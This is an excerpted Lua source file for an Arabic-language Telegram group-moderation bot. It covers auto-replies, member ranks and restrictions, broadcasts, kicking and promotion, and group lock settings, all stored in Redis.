DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📌¦ الكلمه » {* ["..text.."] *} 🍂\n💢¦ تم حذفها من قائمة الردود *\n💥\n", 1, 'md')  
MARX:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    
MARX:del(DEVSTOR.."add:repallt:gif:all"..text..bot_id)    
MARX:del(DEVSTOR.."add:rep:tvico:all"..text..bot_id)    
MARX:del(DEVSTOR.."add:rep:tstekr:all"..text..bot_id)    
MARX:del(DEVSTOR.."add:rep:text:all"..text..bot_id)    
MARX:del(DEVSTOR.."mall:addreply1:photo:gp"..text..bot_id)
MARX:del(DEVSTOR.."mall:addreply1:video:gp"..text..bot_id)
MARX:del(DEVSTOR.."mall:addreply1:document:gp"..text..bot_id)
MARX:del(DEVSTOR.."mall:addreply1:audio:gp"..text..bot_id)
MARX:srem(DEVSTOR.."rep:media:all"..bot_id,text)    
end
return false    end    
end    
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
...
local test = MARX:get(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    
if msg.content_.sticker_ then     
MARX:set(DEVSTOR.."add:rep:tstekr:all"..test..bot_id, msg.content_.sticker_.sticker_.persistent_id_)    
end     
if msg.content_.voice_ then    
MARX:set(DEVSTOR.."add:rep:tvico:all"..test..bot_id, msg.content_.voice_.voice_.persistent_id_)    
end     
if msg.content_.animation_ then     
MARX:set(DEVSTOR.."add:repallt:gif:all"..test..bot_id, msg.content_.animation_.animation_.persistent_id_)    
end    
if text then     
MARX:set(DEVSTOR.."add:rep:text:all"..test..bot_id, text)    
end    
if msg.content_.audio_ then
MARX:set(DEVSTOR.."mall:addreply1:audio:gp"..test..bot_id, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
MARX:set(DEVSTOR.."mall:addreply1:document:gp"..test..bot_id, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
MARX:set(DEVSTOR.."mall:addreply1:video:gp"..test..bot_id, msg.content_.video_.video_.persistent_id_)  
MARX:set(DEVSTOR.."mall:addreply1:video:caption:gp"..test..bot_id,(msg.content_.caption_ or ''))  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
MARX:set(DEVSTOR.."mall:addreply1:photo:gp"..test..bot_id, photo_in_group)  
MARX:set(DEVSTOR.."mall:addreply1:photo:caption:gp"..test..bot_id,(msg.content_.caption_ or ''))  
end
MARX:del(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id)    
return false    end    
end
if text and not MARX:get(DEVSTOR..'lock:rep:all'..bot_id) then    
local anemi = MARX:get(DEVSTOR.."add:repallt:gif:all"..text..bot_id)    
local veico = MARX:get(DEVSTOR.."add:rep:tvico:all"..text..bot_id)    
local stekr = MARX:get(DEVSTOR.."add:rep:tstekr:all"..text..bot_id)      
local taha = MARX:get(DEVSTOR.."add:rep:text:all"..text..bot_id)    
local video_caption = MARX:get(DEVSTOR.."mall:addreply1:video:caption:gp"..text..bot_id)
local photo_caption = (MARX:get(DEVSTOR.."mall:addreply1:photo:caption:gp"..text..bot_id) or '' )
local photo = MARX:get(DEVSTOR.."mall:addreply1:photo:gp"..text..bot_id)
local video = MARX:get(DEVSTOR.."mall:addreply1:video:gp"..text..bot_id)
local document = MARX:get(DEVSTOR.."mall:addreply1:document:gp"..text..bot_id)
local audio = MARX:get(DEVSTOR.."mall:addreply1:audio:gp"..text..bot_id)
if taha then     
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, ''..check_markdown(taha)..'', 1, 'md')      
return false    end     
if veico then     
...
local group = MARX:smembers(DEVSTOR..'bot:gpsby:id')   
local w = 0
local q = 0
for i = 1, #group do
...
MARX:srem(DEVSTOR.."bot:gpsby:id",group[i])  
rem_group(group[i])   
...
local pv = MARX:smembers(DEVSTOR..'usersbot')   
local sendok = 0
for i = 1, #pv do
...
MARX:srem(DEVSTOR.."usersbot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
MARX:set(DEVSTOR..'id:gp'..msg.chat_id_,taha)  
MARX:setex(DEVSTOR.."bc:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
...
if text then 
if is_mod(msg) then
if text == 'ارسال نسخه' and is_devtaha(msg) then  sendDocument(SUDO, 0, 0, 1, nil, './DEVIL.lua', '🚸¦اسم الملف ( DEVIL.lua )\n♻¦عدد المشتركين ( '..(MARX:scard(DEVSTOR.."usersbot") or 0)..' )\n📮¦عدد المجموعات ( '..(MARX:scard(DEVSTOR.."botgps") or 0)..' )',dl_cb, nil)  end
...
local pv = MARX:scard(DEVSTOR.."usersbot")      
...
local grp = MARX:scard(DEVSTOR.."bot:gpsby:id")       
...
local grall = MARX:scard(DEVSTOR.."botgps") or 0  
local gradd = MARX:scard(DEVSTOR..'bot:gpsby:id') or 0  
local uspv = MARX:scard(DEVSTOR.."usersbot") or 0  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'\n*📮¦ عدد المجموعات الكلي ↫ ❪'..grall..'❫\n📬¦ عدد المجموعات المفعله ↫ ❪'..gradd..'❫\n📛¦ عدد المجموعات غير مفعله ↫ ❪'..(grall - gradd)..'❫\n💥¦ عدد المشتركين ↫ ❪'..uspv..'❫*\n✓', 1, 'md') 
end
...
local pv = 0
for k,v in pairs(list) do    
MARX:srem(DEVSTOR..'usersbot',v)  
pv = pv + 1
end   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*🎲¦ تم مسح » ❪'..pv..'❫ من المشتركين *\n', 1, 'md') 
end  
if text == 'غادر' and is_owner(msg) then 
MARX:srem(DEVSTOR.."addgrop", msg.chat_id_) 
MARX:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true) 
rem_group(msg.chat_id_)  
rem_lockal(msg.chat_id_) 
MARX:del(DEVSTOR.."test:group"..msg.chat_id_)   
MARX:del(DEVSTOR..'moder'..msg.chat_id_) 
MARX:del(DEVSTOR..'modergroup'..msg.chat_id_) 
MARX:del(DEVSTOR..'mods:'..msg.chat_id_) 
MARX:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true) 
MARX:srem(DEVSTOR..'bot:gpsby:id', msg.chat_id_)  
MARX:srem(DEVSTOR.."botgps", msg.chat_id_)   
changeChatMemberStatus(msg.chat_id_, bot_id, "Left") 
...
local list = MARX:smembers(DEVSTOR..'tedmembars'..msg.chat_id_) 
local pv = 0
for k,v in pairs(list) do   
MARX:del(DEVSTOR..'tedmembars'..msg.chat_id_) 
MARX:srem(DEVSTOR.."keed", msg.chat_id_)  
...
return false  end
if kk.id_ then  
local msgss = tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..kk.id_) or 0)  
...
t = 'مطور اساسي'
elseif MARX:sismember(DEVSTOR..'sudo:bot',kk.id_) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,kk.id_) then
t = 'المنشئ'
elseif MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,kk.id_) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,kk.id_) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:groups',kk.id_) then
t = 'مميز عام'
elseif MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,kk.id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
...
if MARX:sismember(DEVSTOR..'DEVIL:gbaned',kk.id_) then
kkeed = 'محظور عام'
elseif MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,kk.id_) then
kkeed = 'محظور'
elseif MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,kk.id_) then
kkeed = 'مكتوم'
elseif MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,kk.id_) then
kkeed = 'مقيد'
else
kkeed = ' لا يوجد'
end
...
'` ❫\n⭐*¦ رتبـة الكروب » ❪ '..rtpa..
' ❫\n🎖¦ رتبـة البوت » ❪ '..t..
' ❫\n📨¦ رسـائله » ❪ '..(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..kk.id_) or 0)..
...
local msgss = tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..iduser) or 0)  
...
t = 'مطور اساسي'
elseif MARX:sismember(DEVSTOR..'sudo:bot',iduser) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,iduser) then
t = 'المنشئ'
elseif MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,iduser) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,iduser) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:groups',iduser) then
t = 'مميز عام'
elseif MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,iduser) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
...
if MARX:sismember(DEVSTOR..'DEVIL:gbaned',iduser) then
kkeed = 'محظور عام'
elseif MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,iduser) then
kkeed = 'محظور'
elseif MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,iduser) then
kkeed = 'مكتوم'
elseif MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,iduser) then
kkeed = 'مقيد'
else
kkeed = ' لا يوجد'
end
...
' }❫\n⭐¦ رتبـة الكروب » ❪ '..rtpa..
' ❫\n🎖¦ رتبـة البوت » ❪ '..t..
' ❫\n📨¦ رسـائله » ❪ '..(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..iduser) or 0)..
' ❫\n🗳¦ تفــاعله » ❪ '..formsgg(msgss)..' ❫'..photouser1..
'\n🚸¦ نوع القيود » ❪ '..kkeed..
' ❫\n🔹¦ التواجد » ❪ '..tt..
' ❫\n⚡¦ نوع حسابه » ❪ '..acca..' ❫'
...
local msgss = tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.sender_user_id_) or 0)  
...
t = 'مطور اساسي'
elseif MARX:sismember(DEVSTOR..'sudo:bot',result.sender_user_id_) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,result.sender_user_id_) then
t = 'المنشئ'
elseif MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:groups',result.sender_user_id_) then
t = 'مميز عام'
elseif MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,result.sender_user_id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
...
if MARX:sismember(DEVSTOR..'DEVIL:gbaned',result.sender_user_id_) then
kkeed = 'محظور عام'
elseif MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_) then
kkeed = 'محظور'
elseif MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_) then
kkeed = 'مكتوم'
elseif MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) then
kkeed = 'مقيد'
else
kkeed = 'لا يوجد'
end
...
' }❫\n⭐¦ رتبـة الكروب » ❪ '..rtpa..
' ❫\n🎖¦ رتبـة البوت » ❪ '..t..
' ❫\n📨¦ رسـائله » ❪ '..(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..result.sender_user_id_) or 0)..
' ❫\n🗳¦ تفــاعله » ❪ '..formsgg(msgss)..' ❫'..photouser1..
'\n🚸¦ نوع القيود » ❪ '..kkeed..
' ❫\n🔹¦ التواجد » ❪ '..tt..
' ❫\n⚡¦ نوع حسابه » ❪ '..acca..' ❫'
...
local msgss = tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..tes.content_.entities_[0].user_id_) or 0)  
...
t = 'مطور اساسي'
elseif MARX:sismember(DEVSTOR..'sudo:bot',tes.content_.entities_[0].user_id_) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
t = 'المنشئ'
elseif MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:groups',tes.content_.entities_[0].user_id_) then
t = 'مميز عام'
elseif MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
...
if MARX:sismember(DEVSTOR..'DEVIL:gbaned',tes.content_.entities_[0].user_id_) then
kkeed = 'محظور عام'
elseif MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
kkeed = 'محظور'
elseif MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
kkeed = 'مكتوم'
elseif MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,tes.content_.entities_[0].user_id_) then
kkeed = 'مقيد'
else
kkeed = ' لا يوجد'
end
...
' }❫\n⭐¦ رتبـة الكروب » ❪ '..rtpa..
' ❫\n🎖¦ رتبـة البوت » ❪ '..t..
' ❫\n📨¦ رسـائله » ❪ '..(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..tes.content_.entities_[0].user_id_) or 0)..
' ❫\n🗳¦ تفــاعله » ❪ '..formsgg(msgss)..' ❫'..photouser1..
'\n🚸¦ نوع القيود » ❪ '..kkeed..
' ❫\n🔹¦ التواجد » ❪ '..tt..
' ❫\n⚡¦ نوع حسابه » ❪ '..acca..' ❫'
...
MARX:setex(DEVSTOR.."get:link:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local t = '*📮¦ حسنآ ارسل لي ايدي المجموعه*\n💥'  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
end
if text and text:match("^معلومات$") and is_devtaha(msg) then  
MARX:setex(DEVSTOR.."get:info:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local t = '*📮¦ حسنآ ارسل لي ايدي المجموعه*\n💥'  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
end
if text == 'الكروبات' and is_sudo(msg) then 
local t = MARX:scard(DEVSTOR.."botgps")
local y = MARX:scard(DEVSTOR.."bot:gpsby:id") 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ العدد الكلي للكروبات هو » ❪'..(y)..'❫* \n', 1, 'md') 
end
if text == 'المشتركين' and is_sudo(msg) then     
local addgrop = MARX:scard(DEVSTOR.."usersbot") or 0    
...
MARX:setex(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local t = '*📊¦ ارسل لي العدد الان*'  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
end
if text == 'مسح المجموعات' and is_devtaha(msg) then 
local lgp = MARX:smembers(DEVSTOR.."bot:gpsby:id") 
local lsug = MARX:smembers(DEVSTOR.."botgps") 
local lgpn = MARX:scard(DEVSTOR.."bot:gpsby:id") 
local lsugn = MARX:scard(DEVSTOR.."botgps") + MARX:scard(DEVSTOR.."bot:gpsby:id") 
...
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,admins[i].user_id_) 
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,b) 
if b.username_ == true then
MARX:set(DEVSTOR.."user:Name"..b.id_,"@"..b.username_)
end
if b.first_name_ == false then
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,admins[i].user_id_) 
end
end,nil)   
else
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,admins[i].user_id_) 
...
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,owner_id) 
end
end
...
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,owner_id) 
return false  end
...
MARX:set(DEVSTOR..'group:name'..msg.chat_id_,name)
end
end,nil) 
end
...
MARX:set(DEVSTOR.."link:group"..msg.chat_id_, 'setlinkwai') 
end
if text == "الرابط" then 
local link = MARX:get(DEVSTOR.."link:group"..msg.chat_id_)            
if link then                              
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*ٴ📮¦ »* رابط مجموعة ↓\n*ٴ📬¦ » '..MARX:get(DEVSTOR..'group:name'..msg.chat_id_)..' *\n*ٴ📛¦* » ['..link..']\n💥', 1, 'md')                          
else                
...
MARX:del(DEVSTOR.."link:group" .. msg.chat_id_)       
end
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and is_devtaha(msg) then 
MARX:setex(DEVSTOR.."bc:in:gropsfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:setex(DEVSTOR.."bc:in:pvfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:setex(DEVSTOR.."bc:in:allfwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:setex(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:setex(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:setex(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:setex(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
...
MARX:del(DEVSTOR.."rules:group" .. msg.chat_id_) 
end
if text and text:match("^القوانين$") then 
local rules = MARX:get(DEVSTOR.."rules:group" .. msg.chat_id_)   
if rules then     
...
MARX:srem(DEVSTOR..'bot:gps',gp) 
MARX:srem(DEVSTOR..'bot:gpsby:id',gp) 
MARX:srem(DEVSTOR.."botgps",gp) 
MARX:del(DEVSTOR..'mod:'..gp) 
MARX:del(DEVSTOR..'moder'..gp) 
MARX:del(DEVSTOR..'banned:'..gp) 
MARX:del(DEVSTOR.."add:bot:group"..gp) 
MARX:del(DEVSTOR.."setmoder:"..gp) 
MARX:del(DEVSTOR.."gps:settings:"..gp) 
MARX:del(DEVSTOR.."gps:settings:"..gp) 
...
MARX:set(DEVSTOR..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true) 
...
for k,v in pairs(list) do   
local nummsg = tonumber(MARX:get(DEVSTOR..'groupmsg:'..v..':')) 
numrgroup(v) local numg = (MARX:get(DEVSTOR.."numgrop"..v) or '3')
local namechat = MARX:get(DEVSTOR..'group:name'..v) 
if namechat then
...
if #list >= 25 then  
local groups = MARX:scard(DEVSTOR..'bot:gpsby:id')  
...
local hash = MARX:get(DEVSTOR..'add:welc:'..msg.chat_id_)     
if hash == 'add' then     
return '✓'     
else     
return '✘'     
...
local hash = MARX:hget("flooding:settings:"..msg.chat_id_,"flood")     
if hash then      
if MARX:hget("flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
return 'بالطرد 🚷'     
elseif MARX:hget("flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
return 'بالتقيد 🔏'     
elseif MARX:hget("flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
return 'بالكتم 🔇'           
elseif MARX:hget("flooding:settings:"..msg.chat_id_,"flood") == "del" then     
return 'بالمسح ⚡'     
end      
else     
return '✘'     
...
if MARX:get(DEVSTOR..'lock:tagservrbot'..msg.chat_id_) then
lock_tagservr_bot = '✓'
else 
lock_tagservr_bot = '✘'    
end
...
if MARX:get(DEVSTOR..'lock:edit'..msg.chat_id_) then    
lock_edit = '✓'
else 
lock_edit = '✘'    
end
if MARX:get(DEVSTOR..'lock:edit:media'..msg.chat_id_) then    
lock_edit_med = '✓'
else 
lock_edit_med = '✘'    
end
...
if MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '✓'
elseif MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد 🔏'    
elseif MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم 🔇'    
elseif MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد 🚷'    
else
lock_links = '✘'    
end
if MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '✓'
elseif MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد 🔏'    
elseif MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم 🔇'   
elseif MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد 🚷'    
else
lock_cmds = '✘'    
end
if MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '✓'
elseif MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد 🔏'    
elseif MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم 🔇'    
elseif MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد 🚷'    
else
lock_user = '✘'    
end
if MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '✓'
elseif MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد 🔏'    
elseif MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم 🔇'    
elseif MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد 🚷'    
else
lock_hash = '✘'    
end
...
if MARX:get(DEVSTOR.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '✓'
elseif MARX:get(DEVSTOR.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد 🔏'   
elseif MARX:get(DEVSTOR.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد 🚷'    
else
lock_bots = '✘'    
end
...
if MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '✓'
elseif MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد 🔏'    
elseif MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم 🔇'    
elseif MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد 🚷'    
else
lock_spam = '✘'    
end        
...
MARX:del(DEVSTOR..'add:ch:id')
MARX:del(DEVSTOR..'add:ch:username')
taha = "*📮¦ تم تعطيل الاشتراك الاجباري *\n✓"
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md') 
end
if text == "الاشتراك الاجباري" and is_devtaha(msg) then  
if MARX:get(DEVSTOR..'add:ch:username') then
local addchusername = MARX:get(DEVSTOR..'add:ch:username')
...
if text and text:match('^ضع تكرار (%d+)$') and is_mod(msg) then MARX:hset("flooding:settings:"..msg.chat_id_ ,"floodmax" ,text:match('ضع تكرار (.*)')) DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم وضع عدد التكرار في المجموعه ( '..text:match('ضع تكرار (.*)')..' )', 1, 'md') end if text and text:match('^ضع زمن التكرار (%d+)$') and is_mod(msg) then MARX:hset("flooding:settings:"..msg.chat_id_ ,"floodtime" ,text:match('ضع زمن التكرار (.*)')) DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم وضع زمن التكرار في المجموعه ( '..text:match('ضع زمن التكرار (.*)')..' )', 1, 'md') end
if text == 'الترحيب' then 
local getwelcom = MARX:get(DEVSTOR..'welcome:'..msg.chat_id_)  
if getwelcom then 
...
MARX:sadd(DEVSTOR..'DEVIL:kick'..msg.chat_id_,result.sender_user_id_)   
else
...
if da.status_.ID == "ChatMemberStatusLeft" then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تـم طرده من الكروب\n🍃'     
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
return false  end
...
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم طرده من الكروب\n🍃'     
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'DEVIL:kick'..msg.chat_id_,user)   
else
zo = '*??¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تـم طرده من الكروب\n🍃'     
MARX:sadd(DEVSTOR..'DEVIL:kick'..msg.chat_id_,user)   
seavusername(user) 
...
return false  end
if not MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
...
MARX:sadd(DEVSTOR..'vip:group'..msg.chat_id_,result.sender_user_id_)  
else
...
return false  end
if result.id_ then  
if not MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,result.id_) then
setvip = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تـم تـرقيتـه مميز للـكروب'   
MARX:sadd(DEVSTOR..'vip:group'..msg.chat_id_,result.id_)  
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
setvip = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد هو مميز'   
MARX:sadd(DEVSTOR..'vip:group'..msg.chat_id_,result.id_)  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,user) then
if data.username_ == false then
setvip = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه مميز للـكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, setvip, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'vip:group'..msg.chat_id_,user)  
else
setvip = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تـم تـرقيتـه مميز للـكروب'   
MARX:sadd(DEVSTOR..'vip:group'..msg.chat_id_,user)  
seavusername(user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
setvip = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المميزين\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, setvip, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,result.sender_user_id_)  
else
setvip = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تم تنزيله من المميزين'   
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,result.sender_user_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, setvip, 1, 'md') 
...
return false  end
if result.id_ then  
if MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,result.id_) then
setvip = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تم تنزيله من المميزين'   
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,result.id_)  
else
setvip = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ليس مميز'   
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,result.id_)  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,user) then
if data.username_ == false then
setvip = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المميزين\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, setvip, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,user)  
else
setvip = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تم تنزيله من المميزين'   
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,user)  
